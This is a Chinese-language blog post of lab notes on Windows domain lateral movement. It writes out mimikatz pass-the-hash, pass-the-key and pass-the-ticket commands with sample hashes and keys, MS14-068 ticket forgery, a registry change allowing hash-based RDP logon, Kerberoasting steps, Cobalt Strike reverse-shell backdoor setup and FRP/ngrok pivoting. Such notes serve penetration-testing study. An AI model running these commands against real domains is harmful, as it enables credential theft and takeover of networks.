<h4 id="域横向PTH-amp-PTK-amp-PTT"><a href="#域横向PTH-amp-PTK-amp-PTT" class="headerlink" title="域横向PTH&amp;PTK&amp;PTT"></a>域横向PTH&amp;PTK&amp;PTT</h4><h6 id="PTH-利用LM或NTLM的值进行的渗透测试"><a href="#PTH-利用LM或NTLM的值进行的渗透测试" class="headerlink" title="PTH  利用LM或NTLM的值进行的渗透测试"></a>PTH  利用LM或NTLM的值进行的渗透测试</h6><p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash 和NTLM Hash访问远程主机或者服务，而不用提供明文密码</p>
<p>如果禁用了NTLM认证，PsExec无法利用获得的NTLM Hash进行远程连接，但是使用mimlata还是可以攻击成功。对于8.1&#x2F;2012r2，安装补丁kb28719987发的win7&#x2F;2008r2&#x2F;8&#x2F;2012等，可以使用费AES keys代替NT hash来实现PTK攻击</p>
<h6 id="PTT-利用票据凭证TGT进行的渗透测试"><a href="#PTT-利用票据凭证TGT进行的渗透测试" class="headerlink" title="PTT   利用票据凭证TGT进行的渗透测试"></a>PTT   利用票据凭证TGT进行的渗透测试</h6><p>可以理解为网站的cookie，就是一中和别人建立连接的凭据，利用这个凭据可以再次和别人建立连接</p>
<p>ptt攻击不是简单的NTLM认证，同时利用kerberos协议进行攻击的</p>
<p>攻击方式有ms14-068、黄金票据和白银票据</p>
<p>ms14-068的危害是允许域内任何一个普通用户，，将自己提升至域管理权限。微软给处补丁kb3011780来修复</p>
<h6 id="PTK-利用ekeys-aes256进行的渗透测试"><a href="#PTK-利用ekeys-aes256进行的渗透测试" class="headerlink" title="PTK   利用ekeys   aes256进行的渗透测试"></a>PTK   利用ekeys   aes256进行的渗透测试</h6><p>sekurlsa::ekeys得到aes256的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302151158779.png"
                      alt="image-20230302151158779"
                ></p>
<h5 id="PTH传递-mimikatz"><a href="#PTH传递-mimikatz" class="headerlink" title="PTH传递-mimikatz"></a>PTH传递-mimikatz</h5><p>使用mimikatz获取密码等信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302150502637.png"
                      alt="image-20230302150502637"
                ></p>
<p>在mimikatz里面使用   sekurlsa::pth（通过PTH连接） &#x2F;user（用户名）:administrator     &#x2F;domain（域名）:god       &#x2F;ntlm（哈希密码）:ccef208c6485269c20db2cad21734fe7</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302152334981.png"
                      alt="image-20230302152334981"
                ></p>
<p>该命令是通过hash来连接到域控主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302152418333.png"
                      alt="image-20230302152418333"
                ></p>
<p>即可得到控制权，然后就可以用at&amp;schtasks来进行后门的注入，如果权限不够就涉及提权了</p>
<p>对于上面提到的微软打的补丁，没有打补丁的适用于这个方法，打了补丁只能administrator连接</p>
<h5 id="利用哈希传递登入远程桌面"><a href="#利用哈希传递登入远程桌面" class="headerlink" title="利用哈希传递登入远程桌面"></a>利用哈希传递登入远程桌面</h5><p>条件：1.远程主机开启了“受限管理员”模式</p>
<p>​            2.用户位于远程主机的管理员组中</p>
<p>​            3.目标用户的哈希</p>
<p>开启”受限管理员“模式,win8.1 win server 2012 R2默认开启</p>
<p>手动开启<code>reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG-dword /d 00000000 /f</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看是否开启“受限管理员模式”</span><br><span class="line">reg query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin</span><br><span class="line">0启动    1不启动</span><br><span class="line">如果开启就可以minikatz实现</span><br><span class="line">privilege::dubug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:用minikatz获取 “/run:mstsc.exe /restrictedadmin”</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:hack-my.com &#x2F;ntlm:38fe728ae616f0fde13715e7c320685f “&#x2F;run:mstsc.exe&#x2F;restrictedadmin”</p>
<p>大致的原理是，哈希传递成功后执行“mstsc.exe&#x2F;restrictedadmin”</p>
<p>受限管理员运行远程桌面客户端，不需要用户名密码即可登入进去</p>
<h5 id="PTK传递-mimikatz"><a href="#PTK传递-mimikatz" class="headerlink" title="PTK传递-mimikatz"></a>PTK传递-mimikatz</h5><p>打补丁后工作组及域连接：必须打补丁后才能用户连接</p>
<p>sekurlsa::ekeys  用来获取aes</p>
<p>sekurlsa::pth  &#x2F;user:mary  &#x2F;domain:god &#x2F;aes256: d3444436d7b6c0b57a1cee8907d41fcbe35c3e46779eea77e6311c7df4aaa143</p>
<p>打补丁和没打补丁中PTH和PTK的区别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302160204415.png"
                      alt="image-20230302160204415"
                ></p>
<h5 id="PTT传递-MS140-68-amp-kekoo-amp"><a href="#PTT传递-MS140-68-amp-kekoo-amp" class="headerlink" title="PTT传递-MS140-68&amp;kekoo&amp;"></a>PTT传递-MS140-68&amp;kekoo&amp;</h5><h6 id="MS14068：可以实现普通用户直接后去域控system权限"><a href="#MS14068：可以实现普通用户直接后去域控system权限" class="headerlink" title="MS14068：可以实现普通用户直接后去域控system权限"></a>MS14068：可以实现普通用户直接后去域控system权限</h6><p>执行过程：</p>
<ol>
<li>查看当前sid      whoami&#x2F;user</li>
<li>mimikatz          kerberos::purge（清空当前主机中所有凭证，如果有域成员凭证会影响凭证伪造）</li>
</ol>
<p>​       mimikatz          kerberos::list         查看当前主机的凭证</p>
<p>​       mimikatz          kerberos::ptc         将票据注入到内存中</p>
<ol start="3">
<li><p>利用ms14268生成TGT数据</p>
<pre><code>ms14-068.exe -u 域成员名@域名 -s 当前域用户的sid -d 域控制器地址 -p 域成员密码
</code></pre>
</li>
</ol>
<p>.\MS14-068.exe -u <a class="link"   href="mailto:&#x6d;&#97;&#x72;&#121;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#x72;&#103;" >&#x6d;&#97;&#x72;&#121;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#x72;&#103; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45（注意前面要加.\）</p>
<p>这里发现自动创建了个<a class="link"   href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x6d;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#x64;&#x2e;&#x6f;&#x72;&#103;&#x2e;&#99;&#99;&#97;&#x63;&#104;&#101;" >&#x54;&#x47;&#x54;&#x5f;&#x6d;&#x61;&#114;&#x79;&#x40;&#x67;&#111;&#x64;&#x2e;&#x6f;&#x72;&#103;&#x2e;&#99;&#99;&#97;&#x63;&#104;&#101; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c8272f46779d193ac1693410f196eb69b09225c7.png@831w_153h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/aa8ffd123435e20eca4bcffc13b199bf460c8d2d.png@831w_104h_progressive.webp"
                      alt="img"
                ></p>
<ol start="4">
<li>票据注入内存</li>
</ol>
<p>​       mimikatz.exe “kerberos::ptc <a class="link"   href="mailto:&#x54;&#71;&#x54;&#x5f;&#x6d;&#x61;&#x72;&#121;&#64;&#x67;&#111;&#x64;&#x2e;&#111;&#x72;&#103;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#x65;" >&#x54;&#71;&#x54;&#x5f;&#x6d;&#x61;&#x72;&#121;&#64;&#x67;&#111;&#x64;&#x2e;&#111;&#x72;&#103;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#x65; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ exit</p>
<ol start="5">
<li>然后就可以直接连接了    dir \主机名\c$</li>
</ol>
<h6 id="lodon工具"><a href="#lodon工具" class="headerlink" title="lodon工具"></a>lodon工具</h6><h4 id="域横向cobaltstrike-amp-RDP"><a href="#域横向cobaltstrike-amp-RDP" class="headerlink" title="域横向cobaltstrike&amp;RDP"></a>域横向cobaltstrike&amp;RDP</h4><p>除了IPC WMI SMB等连接方式外还可以使用RDP连接</p>
<p>RDP协议连接：判断对方远程桌面服务是否开启（默认是：3389），端口扫描可以判断</p>
<h6 id="RDP明文密码连接"><a href="#RDP明文密码连接" class="headerlink" title="RDP明文密码连接"></a>RDP明文密码连接</h6><p>win+r  运行mstsc</p>
<p>输入域控主机IP地址，然后用户名，再用获取到的密码远程连接（鸡肋用不到，连不上，cao！）</p>
<p>也可以使用命令行来连接</p>
<p>—mstsc.exe &#x2F;console &#x2F;v:192.168.3.21 &#x2F;admin</p>
<p>—对linux来说: rdesktop 192.168.3.21:3389 </p>
<h6 id="RDP密文HASH链接"><a href="#RDP密文HASH链接" class="headerlink" title="RDP密文HASH链接"></a>RDP密文HASH链接</h6><p>—windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持</p>
<p>—REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f </p>
<p>然后运行mstsc.exe &#x2F;restrictedadmin</p>
<h6 id="域横向移动SPN服务-探针-请求-导出-破解-重写"><a href="#域横向移动SPN服务-探针-请求-导出-破解-重写" class="headerlink" title="域横向移动SPN服务-探针-请求-导出-破解-重写"></a>域横向移动SPN服务-探针-请求-导出-破解-重写</h6><p>SPN：服务主体名称是kerberos客户端用于唯一标识给特定的kerberos目标计算机的服务实例名称（类似于token）</p>
<p>Kerberos身份验证使用SPN将服务实例和服务的登入账户相关联，如果安装多个服务实例，每一个实例都需要有自己唯一的SPN</p>
<h6 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">在获取的域内主机中cmd  输入  setspn -q */*  (扫描全部，这里每个域用户对应的SPN服务都有)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303134627617.png"
                     
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">寻找特定sSPN服务   setspn -q */* |findstr“MSSQL”</span><br></pre></td></tr></table></figure></div>

<h6 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h6><p>先使用klist purge删除原有票据</p>
<p>（power shell）     Add-Type -AssemblyName System.IdentityModel</p>
<p>再使用这个</p>
<p> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc&#x2F;fileserv.god.org:1433（服务名探针可找到）” </p>
<h6 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h6><p>使用mimikatz导出</p>
<p>kerberos::list &#x2F;export</p>
<h6 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303140921568.png"
                      alt="image-20230303140921568"
                ></p>
<p>破解工具tgsrepcrack.py破解服务票据（python3环境）</p>
<p>—将以mssql开头的文件拖到本地Kerberos进行密码爆破</p>
<p>—kerberoast下载（专门针对Kerberos协议，tgsrepcrack.py是其中一个脚本）：<a class="link"   href="https://github.com/nidem/kerberoast" >https://github.com/nidem/kerberoast <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>首先创建一个密码字典</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4827547fb5b70b382c2f60dda7fc23006eeefe3b.png@366w_191h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>然后使用爆破脚本tgsrepcrack.py（要先pip install pysn1）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9500bea8926429dd8e55b5d56133649c3a17d190.png@831w_209h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303140552385.png"
                      alt="image-20230303140552385"
                ></p>
<p>得到密码</p>
<h6 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303141012726.png"
                      alt="image-20230303141012726"
                ></p>
<p>主要原理就是将得到的票据重写（伪造票据），然后将其通过mimikatz注入到内存中即可</p>
<p>注入之后就可以连接靶机：</p>
<p>dir &#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;c$(查看靶机c盘文件)</p>
<h6 id="CobaltStrike工具使用"><a href="#CobaltStrike工具使用" class="headerlink" title="CobaltStrike工具使用"></a>CobaltStrike工具使用</h6><p>大概流程：启动-配置-监听-执行-上线-提权-信息收集-渗透</p>
<p>在服务器中（外网环境）安装CobaltStrike并且提前配置Java环境</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java环境安装教程</span><br><span class="line">sudo apt install openjdk-11-jdk</span><br></pre></td></tr></table></figure></div>

<p>启动服务端（服务器启动）</p>
<p>.&#x2F;teamserve ‘本服务器IP’ ‘团队接入的口令可以随便写’</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/f5893e5a1ced0b278f9bf8219aeea5c3d45ec8fe.png@831w_96h_progressive.webp"
                      alt="img"
                ></p>
<p>服务器端需要root权限，要在云端服务器打开50050端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b29af5915adc8765aef8736aeb3fc0ce1b12b702.png@513w_245h_progressive.webp"
                      alt="img"
                ></p>
<p>本地计算机启动<strong>CobaltStrike</strong>中的start.bat开启，并且配置在服务器上填写的ip和端口，user随便输</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/d3825132a2697f24040c20f46c1eae4eb289fddc.png@708w_215h_progressive.webp"
                      alt="img"
                ></p>
<p>这个工具与msf最大的区别就是支持多个人一同协作</p>
<p>由于是多人协作所以要区分哪些资源是各自的，通过配置监听器来实现拥有各自的监听管道（后门传输管道）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e519023d26a41d147744dbad80057c812f062127.png@831w_468h_progressive.webp"
                      alt="img"
                ></p>
<p>监听器具有多种协议，常见的有：dns&#x2F;http&#x2F;smb&#x2F;c2</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/439e27ed691d00b293fd87de347187923edc72fa.png@453w_192h_progressive.webp"
                      alt="img"
                ></p>
<p>ip和端口就是shell要返回的地址（在这里只能是外网服务器）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/fcfb0947f8b466c569e7ffb5235cf4d8dd75fe86.png@702w_342h_progressive.webp"
                      alt="img"
                ></p>
<p>创建成功后，生成可执行文件（有不同的格式，选择windows64位的exe）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9f141d34e95c100ddb1669790fe7b8107235589c.png@429w_219h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/56937c29ac696ccbdce40aa6955b6e0cbcab644c.png@554w_255h_progressive.webp"
                      alt="img"
                ></p>
<p>将生成的的后门exe复制到域靶机中运行，就会反弹靶机的shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/259a810e6ab3fa04238cdfaa1f0195f41152e7ab.png@831w_180h_progressive.webp"
                      alt="img"
                ></p>
<p>进入图形化界面右击鼠标选择interact，即可调出命令窗口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/73f6087005ee9f00460eb30c35d23c2770a8c509.png@512w_167h_progressive.webp"
                      alt="img"
                ></p>
<p>输入shell ipconfig查看ip配置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/f5be55a7b9ba803a584034c62568fb5b545d42fe.png@831w_291h_progressive.webp"
                      alt="img"
                ></p>
<p>在图形化界面进行提权操作（自带提权插件太少需要自己安装插件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e68e4c13f949649acddba433fea1c8deec0795da.png@633w_263h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="关于提权及插件加载"><a href="#关于提权及插件加载" class="headerlink" title="关于提权及插件加载"></a>关于提权及插件加载</h6><p>以下使用的提权插件为：taowu-cobalt-strike 和Erebus</p>
<p>点击加载插件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/86a402e6e9fc6a06e9383a92610ecc33d2d8a63c.png@831w_416h_progressive.webp"
                      alt="img"
                ></p>
<p>加载第三方提权模块，发现提权模块变多了，选择m14-508</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1c08beee62ad0b7d58050752403fdb5409f3bfb1.png@551w_173h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4e78a21c07c34979a5781061f2e26575425932c7.png@594w_254h_progressive.webp"
                      alt="img"
                ></p>
<p>！！！！m14-508漏洞描述</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e83ce667d677ebf25a26d314969df09f77edc755.png@831w_240h_progressive.webp"
                      alt="img"
                ></p>
<p>即可提升至system权限</p>
<h6 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h6><p>在命令终端输入net view探活主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2971a9d0399b422bb43fa9f3fc97785758f767da.png@831w_177h_progressive.webp"
                      alt="img"
                ></p>
<p>点击view中targets将探针的主机显示出来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7e380d0b68d3ead9bf5b78b04b78c61e7ff9c77d.png@831w_299h_progressive.webp"
                      alt="img"
                ></p>
<p>也可以用批量代码执行</p>
<p>— for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”</p>
<p>提权成功之后就可以，导出hash值，利用mimikatz进行横向渗透，也可以上传后门工具进行进一步攻击。如Ladon啥的工具</p>
<p>这个指令可以直接获得域控的地址net dclist</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304135454384.png"
                      alt="image-20230304135454384"
                ></p>
<p>CobaltStrike Aggressor 脚本合集（可以自行在GitHub搜索）：</p>
<p><a class="link"   href="https://github.com/harleyQu1nn/AggressorScripts" >https://github.com/harleyQu1nn/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/Und3rf10w/Aggressor-scripts" >https://github.com/Und3rf10w/Aggressor-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/001SPARTaN/aggressor_scripts" >https://github.com/001SPARTaN/aggressor_scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/rasta-mouse/Aggressor-Script" >https://github.com/rasta-mouse/Aggressor-Script <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/threatexpress/aggressor-scripts" >https://github.com/threatexpress/aggressor-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/ramen0x3f/AggressorScripts" >https://github.com/ramen0x3f/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/FortyNorthSecurity/AggressorAssessor" >https://github.com/FortyNorthSecurity/AggressorAssessor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/michalkoczwara/aggressor_scripts_collection" >https://github.com/michalkoczwara/aggressor_scripts_collection <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/ars3n11/Aggressor-Scripts" >https://github.com/ars3n11/Aggressor-Scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor" >https://github.com/gaudard/scripts/tree/master/red-team/aggressor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/bluscreenofjeff/AggressorScripts" >https://github.com/bluscreenofjeff/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/vysecurity/Aggressor-VYSEC" >https://github.com/vysecurity/Aggressor-VYSEC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit" >https://github.com/killswitch-GUI/CobaltStrike-ToolKit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/rsmudge/ElevateKit" >https://github.com/rsmudge/ElevateKit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （第三方提权攻击）</p>
<p><a class="link"   href="https://github.com/QAX-A-Team/CobaltStrike-Toolset" >https://github.com/QAX-A-Team/CobaltStrike-Toolset <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/DeEpinGh0st/Erebus" >https://github.com/DeEpinGh0st/Erebus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （Erebus CobaltStrike后渗透测试插件，持续更新）（本文选择的插件）</p>
<p><a class="link"   href="https://github.com/branthale/CobaltStrikeCNA" >https://github.com/branthale/CobaltStrikeCNA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/pandasec888/taowu-cobalt-strike%EF%BC%88%E6%9C%AC%E6%96%87%E9%80%89%E6%8B%A9%E7%9A%84%E6%8F%92%E4%BB%B6%EF%BC%89" >https://github.com/pandasec888/taowu-cobalt-strike（本文选择的插件） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="域横向内网漫游socks代理隧道技术"><a href="#域横向内网漫游socks代理隧道技术" class="headerlink" title="域横向内网漫游socks代理隧道技术"></a>域横向内网漫游socks代理隧道技术</h4><h6 id="内网：具有私有网段地址，如10-x2F-8，172-16-x2F-12，192-168-x2F-16等这些可称为内网网段"><a href="#内网：具有私有网段地址，如10-x2F-8，172-16-x2F-12，192-168-x2F-16等这些可称为内网网段" class="headerlink" title="内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段"></a>内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段</h6><h6 id="正向连接和反向连接"><a href="#正向连接和反向连接" class="headerlink" title="正向连接和反向连接"></a>正向连接和反向连接</h6><p>正向：控制端连接被控制端</p>
<p>反向：被控制端去连接控制端</p>
<p>在内网环境中是不能被外网主动发现连接的，所以这时候就需要通过内网主动反向的连接外网控制端</p>
<h6 id="代理和隧道的区别"><a href="#代理和隧道的区别" class="headerlink" title="代理和隧道的区别"></a>代理和隧道的区别</h6><p>代理：主要是解决了网络的连通性问题，但是有些防火墙就会设置禁止代理的相关协议，这时候就需要隧道</p>
<p>隧道：可以认为是代理的高级版，它利用了协议的伪装，可以解决流量分析和监控工具，和防火墙等一系列相关工具的过滤问题</p>
<h5 id="内网穿透Ngrok测试演示-两个内网通讯上线"><a href="#内网穿透Ngrok测试演示-两个内网通讯上线" class="headerlink" title="内网穿透Ngrok测试演示-两个内网通讯上线"></a>内网穿透Ngrok测试演示-两个内网通讯上线</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304154406960.png"
                      alt="image-20230304154406960"
                ></p>
<p>试想以下两个内网中，互补相通该怎么交换数据？？</p>
<p>能想到的是交给一个中间人帮忙传递，这就跟代理类似，利用一个云主机做代理帮助两个内网主机传递数据</p>
<p>由于没有ngrok，这里引用别人的笔记</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304205653387.png"
                      alt="image-20230304205653387" style="zoom:150%;" 
                >

<p>kali作为控制端，运行ngrok的客户端，并且利用msf生成后门文件进行上传来实现反弹shell，利用的是代理服务器的中转功能</p>
<p>这个后门文件主要是将内网靶机的shell发送至代理服务器，然后再由代理服务器反弹shell至外网攻击机</p>
<p>主要步骤：攻击机连接代理服务器—-&gt;msf生成一个后门文件植入靶机（收集的信息发送至代理服务器）—-&gt;代理服务器又将信息反弹至攻击机</p>
<h6 id="内网穿透Frp自建跳板测试-两个内网通讯上线"><a href="#内网穿透Frp自建跳板测试-两个内网通讯上线" class="headerlink" title="内网穿透Frp自建跳板测试-两个内网通讯上线"></a>内网穿透Frp自建跳板测试-两个内网通讯上线</h6><p>Frp是现在比较主流的工具，分为服务端（中转的服务器）和控制端（攻击机和靶机）</p>
<p>FRP下载地址：<a class="link"   href="https://github.com/fatedier/frp/releases" >https://github.com/fatedier/frp/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>服务端：下载-解压-修改-启动（对于阿里云主机要修改安全组配置出入口）</p>
<p>将下载好的包上传到服务器，并且解压frp包</p>
<h6 id="实战环境"><a href="#实战环境" class="headerlink" title="实战环境"></a>实战环境</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230313081434957.png"
                      alt="image-20230313081432510"
                ></p>
<p>网络一级代理</p>
<p>已经获得win server 2012的控制权，需要继续登陆FTP服务器</p>
<p>1.利用VPS作为FRP的服务端，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></table></figure></div>

<p>配置frps.ini文件如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0         服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000            服务端绑定的端口</span><br></pre></td></tr></table></figure></div>

<p>2.win server 2012作为客户端，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></table></figure></div>

<p>客户端文件frpc.ini配置如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1000            代理所使用的端口，会被转发到服务端</span><br><span class="line">plugin = socks5               代理的类型</span><br></pre></td></tr></table></figure></div>

<p>至此输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains ssh root@10.10.10.15      便可成功登入FTP服务器</span><br></pre></td></tr></table></figure></div>



<p>二级网络代理</p>
<p>同样先VPS作为服务端，启动</p>
<p>win server2012作为客户端启动</p>
